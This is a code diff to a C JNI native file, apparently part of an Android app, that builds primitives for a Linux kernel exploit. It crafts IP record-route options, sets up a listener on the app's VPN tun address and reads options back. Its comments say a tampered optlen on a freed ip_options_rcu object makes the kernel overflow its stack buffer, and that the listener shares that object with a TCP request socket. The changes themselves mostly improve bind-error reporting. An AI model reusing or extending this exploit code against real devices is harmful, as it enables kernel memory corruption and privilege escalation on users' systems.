@@ -3,18 +3,19 @@
 // Everything here exists because the interesting interfaces are syscalls that
 // the Java networking stack does not expose:
 //
-//   * setsockopt(IP_OPTIONS)      makes the kernel allocate an ip_options_rcu
-//                                 and hang it off the socket's inet_opt
-//   * getsockopt(IP_OPTIONS)      reads that object back with
-//                                 memcpy(optbuf, &inet_opt->opt,
-//                                        sizeof(struct ip_options) +
-//                                        inet_opt->opt.optlen)
-//                                 into a fixed 56 byte stack buffer, so a
-//                                 tampered optlen turns the read into a stack
-//                                 overflow
+//   * setsockopt(IP_OPTIONS)   makes the kernel allocate an ip_options_rcu and
+//                              hang it off the socket's inet_opt
+//   * getsockopt(IP_OPTIONS)   reads that object back with
+//                              memcpy(optbuf, &inet_opt->opt,
+//                                     sizeof(struct ip_options) +
+//                                     inet_opt->opt.optlen)
+//                              into a fixed 56 byte stack buffer, so a tampered
+//                              optlen turns the read into a stack overflow
 //
-// The Java side never needed either of these before, so the whole point of the
-// file is to put those two calls - and a controlled socket - within reach.
+// Bind failures are reported with the real errno in the returned string. The
+// first attempt at building a listener just said "failed", which is not enough
+// to tell EADDRINUSE from a namespace problem, and those two need completely
+// different fixes.
 
 #include <jni.h>
 
@@ -31,12 +32,12 @@
 
 #define IP_OPTIONS 4
 
-// A record route option that fills the whole 40 byte area.
+// A record route option covering the whole 40 byte area.
 //
-// Length must be 3 + 4n, so 39 leaves one byte for a NOP. The pointer is parked
-// past the end of the slot list so the receive path has nothing to stamp: when
-// the pointer is <= optlen the kernel writes the preferred source address into
-// the option bytes, which changes them underneath us.
+// Length has to be 3 + 4n, so 39 leaves one byte for a NOP. The pointer is
+// parked past the last slot so the receive path has nothing to stamp: with
+// pointer <= optlen the kernel rewrites option bytes with the preferred source
+// address, which would change them underneath the test.
 static void fill_rr(unsigned char *buf, int len, uint32_t tag)
 {
     memset(buf, 0, len);
@@ -74,8 +75,8 @@ Java_com_inj_Native_applyOptions(JNIEnv *env, jclass cls, jint fd, jint tag)
     return 0;
 }
 
-// Read the options back. If optlen was tampered with while the object sat in
-// the slab, this is where the kernel overruns its own stack buffer.
+// Read the options back. If optlen was tampered with while the object sat in a
+// freed slab slot, this is where the kernel overruns its own stack buffer.
 JNIEXPORT jstring JNICALL
 Java_com_inj_Native_readOptions(JNIEnv *env, jclass cls, jint fd)
 {
@@ -97,21 +98,29 @@ Java_com_inj_Native_readOptions(JNIEnv *env, jclass cls, jint fd)
     return (*env)->NewStringUTF(env, hex);
 }
 
-// A listening TCP socket the kernel can grow children from.
+// Listening TCP socket on addr:port.
 //
-// This is the socket whose inet_opt matters: tcp_v4_syn_recv_sock() clones the
-// listener and copies ireq->ireq_opt into the child, so the object created by
-// setsockopt() above is the one that ends up shared with a request socket.
-JNIEXPORT jintArray JNICALL
-Java_com_inj_Native_makeListener(JNIEnv *env, jclass cls, jint port)
+// The address is passed in because the interesting one is the tun endpoint,
+// which only exists inside the app's VPN namespace. A caller that guesses wrong
+// should be able to see which address it actually tried.
+JNIEXPORT jstring JNICALL
+Java_com_inj_Native_makeListener(JNIEnv *env, jclass cls, jstring addr, jint port)
 {
     (void)cls;
 
+    const char *addr_utf = (*env)->GetStringUTFChars(env, addr, NULL);
+    char tried[128];
+    snprintf(tried, sizeof(tried), "%s:%d", addr_utf, (int)port);
+
     int fd = socket(AF_INET, SOCK_STREAM, 0);
     if (fd < 0) {
-        return NULL;
+        int e = errno;
+        (*env)->ReleaseStringUTFChars(env, addr, addr_utf);
+        return err(env, "socket", e);
     }
 
+    // Without this a listener cannot be recreated during a test run while old
+    // connections are still in TIME_WAIT.
     int one = 1;
     setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
 
@@ -119,31 +128,39 @@ Java_com_inj_Native_makeListener(JNIEnv *env, jclass cls, jint port)
     memset(&sa, 0, sizeof(sa));
     sa.sin_family = AF_INET;
     sa.sin_port = htons((uint16_t)port);
-    sa.sin_addr.s_addr = inet_addr("10.7.7.1");
+    if (inet_pton(AF_INET, addr_utf, &sa.sin_addr) != 1) {
+        int e = EINVAL;
+        close(fd);
+        (*env)->ReleaseStringUTFChars(env, addr, addr_utf);
+        return err(env, "inet_pton", e);
+    }
+    (*env)->ReleaseStringUTFChars(env, addr, addr_utf);
 
     if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
         int e = errno;
         close(fd);
-        errno = e;
-        return NULL;
+        char msg[256];
+        snprintf(msg, sizeof(msg), "bind %s: %s (%d)", tried, strerror(e), e);
+        return (*env)->NewStringUTF(env, msg);
     }
+
     if (listen(fd, 128) < 0) {
         int e = errno;
         close(fd);
-        errno = e;
-        return NULL;
+        char msg[256];
+        snprintf(msg, sizeof(msg), "listen %s: %s (%d)", tried, strerror(e), e);
+        return (*env)->NewStringUTF(env, msg);
     }
 
-    jintArray out = (*env)->NewIntArray(env, 1);
-    jint v = fd;
-    (*env)->SetIntArrayRegion(env, out, 0, 1, &v);
-    return out;
+    char ok[192];
+    snprintf(ok, sizeof(ok), "OK fd=%d %s", fd, tried);
+    return (*env)->NewStringUTF(env, ok);
 }
 
-// Create a plain connected UDP socket that owns an ip_options_rcu of its own,
-// without involving the TCP handshake at all. Useful as a control: if the
-// options object survives here but not on the TCP path, the difference is the
-// request socket lifetime, not the allocation itself.
+// UDP socket carrying its own options object, no TCP involved.
+//
+// Useful as a control: if the object survives here but not on the TCP path, the
+// difference is the request socket lifetime rather than the allocation itself.
 JNIEXPORT jintArray JNICALL
 Java_com_inj_Native_makeUdp(JNIEnv *env, jclass cls, jint tag)
 {
